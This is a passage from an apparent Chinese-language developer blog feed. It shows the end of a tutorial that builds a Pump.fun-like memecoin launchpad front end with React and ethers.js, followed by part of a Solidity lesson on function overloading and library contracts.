<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;submitted...&quot;</span>,name ,ticker);</span><br><span class="line">    <span class="title function_">toggleCreate</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>表单的html代码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>list new token<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list_description&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>fee: &#123;ethers.formatEther(fee, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;listHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ticker&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;ticker&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ list ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleCreate&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160659358.png" alt="image-20250217160659358"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160630715.png" alt="image-20250217160630715"></p><h3 id="列出Token">列出Token</h3><p>使用<code>factory</code>对象获取已经创建的<code>token</code>总数<code>totalToken</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取token的总数量</span></span><br><span class="line"><span class="keyword">const</span> totalToken = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line"><span class="keyword">const</span> tokens = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; totalToken; i++)&#123;</span><br><span class="line">  <span class="keyword">const</span> tokenToSale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(i);</span><br><span class="line">  <span class="comment">//输出创建的token的信息</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(tokenToSale);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> token = &#123;</span><br><span class="line">    <span class="attr">token</span>: tokenToSale.<span class="property">token</span>,</span><br><span class="line">    <span class="attr">name</span>: tokenToSale.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">creator</span>: tokenToSale.<span class="property">creator</span>,</span><br><span class="line">    <span class="attr">sold</span>: tokenToSale.<span class="property">sold</span>,</span><br><span class="line">    <span class="attr">raised</span>: tokenToSale.<span class="property">raised</span>,</span><br><span class="line">    <span class="attr">isOpen</span>: tokenToSale.<span class="property">isOpen</span>,</span><br><span class="line">    <span class="attr">image</span>: images[i]</span><br><span class="line">  &#125;</span><br><span class="line">  tokens.<span class="title function_">push</span>(token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setTokens</span>(tokens.<span class="title function_">reverse</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tokens:&quot;</span>,tokens);</span><br></pre></td></tr></table></figure><p>在<code>Token.js</code>中进行前端展示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Token</span>(<span class="params">&#123; toggleTrade, token &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> toggleTrade(token)&#125; className=&quot;token&quot;&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;token_details&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator by &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>market Cap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Token</span>;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217153634506.png" alt="image-20250217153634506"></p><p>界面展示</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154119339.png" alt="image-20250217154119339"></p><h3 id="购买Token">购买Token</h3><p>在<code>Trade.js</code>中，购买<code>token</code>的js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [target, setTarget] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [limit, setLimit] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [cost, setCost] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> amount = form.<span class="title function_">get</span>(<span class="string">&quot;amount&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="keyword">const</span> totalCost = cost * <span class="title class_">BigInt</span>(amount);</span><br><span class="line">  <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line">  <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">buy</span>(</span><br><span class="line">    token.<span class="property">token</span>,</span><br><span class="line">    ethers.<span class="title function_">parseUnits</span>(amount, <span class="number">18</span>),</span><br><span class="line">    &#123;<span class="attr">value</span>: totalCost&#125;</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title function_">toggleTrade</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getSaleDetails</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> target = <span class="keyword">await</span> factory.<span class="title function_">TARGET</span>();</span><br><span class="line">  <span class="title function_">setTarget</span>(target);</span><br><span class="line">  <span class="keyword">const</span> limit = <span class="keyword">await</span> factory.<span class="title function_">TOKEN_LIMIT</span>();</span><br><span class="line">  <span class="title function_">setLimit</span>(limit);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="title function_">setCost</span>(cost);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">getSaleDetails</span>();</span><br><span class="line">&#125;, [token]);</span><br></pre></td></tr></table></figure><p>购买<code>token</code>的html代码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;trade&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>trade<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>  <span class="attr">className</span>=<span class="string">&quot;trade_details&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator: &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>marketcap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>base cost: &#123;ethers.formatEther(cost, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;token.sold &gt;= limit || token.raised &gt;= target ? (</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;disclaimer&quot;</span>&gt;</span>target reached!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  ) : (</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;buyHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">min</span>=<span class="string">&#123;1&#125;</span> <span class="attr">max</span>=<span class="string">&#123;10000&#125;</span> <span class="attr">placeholder</span>=<span class="string">&quot;amount&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ buy ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  ) </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleTrade&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&lt;/div &gt;</span><br></pre></td></tr></table></figure><p>界面展示：</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217161106789.png" alt="image-20250217161106789"></p><h2 id="参考">参考</h2><p><a href="https://www.youtube.com/watch?v=z7Vz8ZKylc4">https://www.youtube.com/watch?v=z7Vz8ZKylc4</a></p><p><a href="https://www.openzeppelin.com/">https://www.openzeppelin.com/</a></p><p><a href="https://github.com/dappuniversity/fun-pump">https://github.com/dappuniversity/fun-pump</a></p><p><a href="https://docs.ethers.org/v5/api/contract/contract/">https://docs.ethers.org/v5/api/contract/contract/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> Solidity </tag>
            
            <tag> Blockchain </tag>
            
            <tag> hardhat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity入门学习(三)</title>
      <link href="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/"/>
      <url>/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="重载">重载</h2><p><code>Solidity</code>中允许函数进行重载（<code>overloading</code>），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<strong><code>Solidity</code>不允许修饰器（<code>modifier</code>）重载。</strong></p><p>测试代码<code>Overloading.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Overloading&#123;</span><br><span class="line">    function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数重载">函数重载</h3><p>我们可以定义两个都叫<code>saySomething()</code>的函数，一个没有任何参数，输出<code>&quot;Nothing&quot;</code>；另一个接收一个<code>string</code>参数，输出这个<code>string</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。</p><p>以 <code>Overloading.sol</code> 合约为例，在 Remix 上编译部署后，分别调用重载函数 <code>saySomething()</code> 和 <code>saySomething(string memory something)</code>，可以看到他们返回了不同的结果，被区分为不同的函数。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204032523893.png" alt="image-20250204032523893"></p><h3 id="参数匹配（Argument-Matching）">参数匹配（Argument Matching）</h3><p>在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫<code>f()</code>的函数，一个参数为<code>uint8</code>，另一个为<code>uint256</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用<code>f(50)</code>，因为<code>50</code>既可以被转换为<code>uint8</code>，也可以被转换为<code>uint256</code>，因此会报错。</p><h2 id="库合约">库合约</h2><p>这一讲，我们用<code>ERC721</code>的引用的库合约<code>Strings</code>为例介绍<code>Solidity</code>中的库合约（<code>Library</code>），并总结了常用的库合约。</p><p>完整的测试代码<code>Library.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 用函数调用另一个库合约</span><br><span class="line">contract UseLibrary&#123;    </span><br><span class="line">    // 利用using for操作使用库</span><br><span class="line">    using Strings for uint256;</span><br><span class="line">    function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">        return _number.toHexString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 直接通过库合约名调用</span><br><span class="line">    function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        return Strings.toHexString(_number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="库合约-2">库合约</h3><p>库合约是一种特殊的合约，为了提升<code>Solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约是一系列的函数合集，由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。</p><p>他和普通合约主要有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接收以太币</li><li>不可以被销毁</li></ol><p>需要注意的是，库合约中的函数可见性如果被设置为<code>public</code>或者<code>external</code>，则在调用函数时会触发一次<code>delegatecall</code>。而如果被设置为<code>internal</code>，则不会引起。对于设置为<code>private</code>可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p><h3 id="Strings库合约">Strings库合约</h3><p><code>Strings库合约</code>是将<code>uint256</code>类型转换为相应的<code>string</code>类型的代码库，样例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 